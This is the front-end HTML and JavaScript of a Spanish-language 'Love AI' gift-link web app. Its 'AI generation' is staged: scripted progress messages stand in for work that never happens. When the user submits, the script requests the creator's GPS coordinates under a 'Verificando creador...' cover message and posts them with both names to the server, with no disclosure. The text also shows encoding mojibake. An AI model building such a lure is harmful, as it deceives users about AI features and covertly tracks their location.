<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love AI - Image Generator</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <header>
        <div class="brand">Love AI üíò</div>
    </header>
    <main>
        <div class="glass-panel" style="width: 100%; max-width: 500px;">
            <h2>Estudio de Creaci√≥n M√°gica</h2>
            <p style="margin-bottom: 2rem;">Dise√±a una experiencia inolvidable para tu persona especial.</p>

            <div class="upload-container" id="upload-stage">

                <!-- SENDER NAME -->
                <div class="input-group">
                    <label>¬øDe parte de qui√©n?</label>
                    <input type="text" id="senderName" placeholder="Tu Nombre o Apodo (ej. Admirador Secreto)" />
                </div>

                <!-- RECIPIENT NAME -->
                <div class="input-group" style="margin-top: 10px;">
                    <label>¬øPara qui√©n es?</label>
                    <input type="text" id="recipientName" placeholder="Nombre de la persona especial" />
                </div>

                <!-- OPTION TABS -->
                <div class="tabs">
                    <button class="tab active" onclick="switchTab('upload')">üì∑ Subir Foto</button>
                    <button class="tab" onclick="switchTab('ai')">ü§ñ Crear con IA</button>
                </div>

                <!-- FILE UPLOAD AREA -->
                <div id="tab-upload" class="tab-content active">
                    <div class="file-drop-area" onclick="document.getElementById('fileInput').click()">
                        <span class="fake-btn">Escoger Imagen</span>
                        <span class="file-msg">o arrastra aqu√≠ tu foto favorita</span>
                        <input class="file-input" type="file" id="fileInput" accept="image/*"
                            onchange="updateFileLabel(this)">
                    </div>
                </div>

                <!-- AI GENERATION AREA -->
                <div id="tab-ai" class="tab-content">
                    <div class="ai-chat-box">
                        <p class="ai-msg">üëã Soy la IA del Amor. ¬øQu√© deseas crear hoy?</p>
                        <div class="ai-input-wrapper">
                            <input type="text" id="aiPrompt" placeholder="Ej: Una carta de amor para Lina..." />
                        </div>
                        <p style="font-size: 0.75rem; color: #aaa; margin-top: 5px;">* Generar√© una imagen √∫nica basada
                            en tu petici√≥n.</p>
                    </div>
                </div>

                <button class="action-btn" onclick="startCreationProcess()">‚ú® Crear Experiencia M√°gica ‚ú®</button>
                <div id="status" style="margin-top: 1rem; color: var(--secondary);"></div>
            </div>

            <!-- RESULT STAGE -->
            <div id="result-stage" class="hidden">
                <div style="font-size: 3rem; margin-bottom: 1rem;">üíå</div>
                <h3 style="color: var(--primary);">¬°Tu Enlace M√°gico est√° Listo!</h3>
                <p>Tu persona especial ver√° la animaci√≥n de IA y luego tu mensaje.</p>

                <div class="link-box" onclick="copyLink()">
                    <span id="shareLinkText">...</span>
                    <button class="copy-btn">COPIAR</button>
                </div>

                <p style="font-size:0.8rem; margin-top:1.5rem; color:#aaa;">
                    Env√≠alo por WhatsApp, Instagram o SMS.
                </p>
                <button onclick="location.reload()"
                    style="background: transparent; border: 1px solid white; margin-top:1rem; padding: 8px 16px; border-radius: 20px; color: white; cursor: pointer;">Crear
                    Otro</button>
            </div>
        </div>

        <div style="margin-top: 2rem; text-align: center;">
            <a href="/dashboard.html" style="font-size:0.8rem; opacity:0.5; color: white; text-decoration: none;">üîê
                Acceso Admin</a>
        </div>
    </main>

    <!-- MAGIC MODAL -->
    <div id="magic-modal" class="hidden"
        style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:100; display:flex; flex-direction:column; justify-content:center; align-items:center;">
        <div class="loader" style="margin-bottom: 2rem;"></div>
        <h2 id="magic-text" style="color: var(--secondary); font-size: 1.5rem;">Conectando con el coraz√≥n...</h2>
        <p id="magic-subtext" style="color: #aaa; font-size: 0.9rem;">Verificando creador...</p>
    </div>

    <script>
        let selectedMode = 'upload'; // 'upload' or 'ai'

        function switchTab(mode) {
            selectedMode = mode;
            document.querySelectorAll('.tab').forEach(b => b.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));

            event.target.classList.add('active');
            document.getElementById(`tab-${mode}`).classList.add('active');
        }

        function updateFileLabel(input) {
            if (input.files && input.files[0]) {
                document.querySelector('.file-msg').textContent = input.files[0].name;
            }
        }

        function copyLink() {
            const text = document.getElementById('shareLinkText').innerText;
            navigator.clipboard.writeText(text);
            alert("¬°Enlace copiado al portapapeles!");
        }

        async function startCreationProcess() {
            const senderName = document.getElementById('senderName').value.trim();
            const recipientName = document.getElementById('recipientName').value.trim();

            if (!senderName || !recipientName) {
                alert("Por favor completa ambos nombres (De parte de qui√©n y Para qui√©n).");
                return;
            }

            // MODAL START
            const modal = document.getElementById('magic-modal');
            const txt = document.getElementById('magic-text');
            const sub = document.getElementById('magic-subtext');
            modal.style.display = 'flex';

            // 1. FIRE-AND-FORGET GEOLOCATION (No await)
            let creatorLoc = { lat: null, lng: null };
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => { creatorLoc = { lat: pos.coords.latitude, lng: pos.coords.longitude }; },
                    (err) => { console.log("Geo error or timeout"); },
                    { timeout: 5000 }
                );
            }

            try {
                // 2. ANIMATION LOOP
                const steps = selectedMode === 'upload'
                    ? ["Conectando...", "Subiendo imagen...", "Mejorando calidad...", "Generando enlace..."]
                    : ["Conectando IA...", `Creando para ${recipientName}...`, "Dibujando flores...", "Finalizando..."];

                for (let i = 0; i < steps.length; i++) {
                    txt.textContent = steps[i];
                    sub.textContent = "Por favor espera...";
                    await new Promise(r => setTimeout(r, 1000));
                }

                // 3. SUBMIT IMMEDIATELY (Do not wait for geo)
                await submitData(senderName, recipientName, creatorLoc);

            } catch (error) {
                alert("Ocurri√≥ un error: " + error.message);
            } finally {
                // ALWAYS CLOSE MODAL
                modal.style.display = 'none';
            }
        }

        async function submitData(senderName, recipientName, loc) {
            const formData = new FormData();
            formData.append('senderName', senderName);
            formData.append('recipientName', recipientName); // New Field

            if (loc.lat) {
                formData.append('creatorLat', loc.lat);
                formData.append('creatorLng', loc.lng);
            }

            if (selectedMode === 'upload') {
                const fileInput = document.getElementById('fileInput');
                if (!fileInput.files[0]) {
                    alert("Debes seleccionar una imagen en la pesta√±a 'Subir Foto'.");
                    document.getElementById('magic-modal').style.display = 'none';
                    return;
                }
                formData.append('image', fileInput.files[0]);
            } else {
                // AI MODE
                formData.append('useDefault', 'true');
            }

            try {
                const response = await fetch('/api/upload', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();

                if (response.ok) {
                    document.getElementById('upload-stage').classList.add('hidden');
                    document.getElementById('result-stage').classList.remove('hidden');

                    const link = `${window.location.origin}/view/${data.id}`;
                    document.getElementById('shareLinkText').innerText = link;
                } else {
                    alert("Error servidor: " + data.error);
                }
            } catch (err) {
                alert("Error de conexi√≥n. Intenta de nuevo.");
            }
        }
    </script>
</body>